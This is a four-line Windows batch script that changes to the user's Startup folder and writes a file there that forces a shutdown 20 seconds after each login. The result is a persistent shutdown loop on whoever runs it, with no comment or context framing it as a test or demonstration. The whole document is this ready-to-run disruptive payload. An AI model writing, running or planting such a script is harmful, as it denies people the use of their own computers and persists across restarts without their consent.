@echo off  
set "startupPath=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"  
cd /d "%startupPath%"  
echo shutdown -s -t 20 > shutdown.bat